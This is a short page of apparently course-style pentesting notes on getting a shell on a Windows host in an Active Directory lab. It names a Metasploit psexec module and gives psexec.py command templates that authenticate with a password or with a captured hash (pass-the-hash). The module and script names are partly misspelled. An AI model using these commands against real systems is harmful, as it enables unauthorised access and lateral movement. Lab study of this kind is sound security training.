---
description: Using the hashes found in previous attacks
---

# Gaining Shell Access

Metasploit(Can use password or we can also use the hash itself)

```
windows/smb/psxec
```

Manually

```
psexec.py marvel.local/fcastle:'<password>'@<ip>
```

`psexec.py <domain name>.local/<user>`

For hash

```
psxec.py <user>@<ip> -hashes <the hash>
```

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption><p>Which part of hash to copy for manual/metasploit intial attack</p></figcaption></figure>

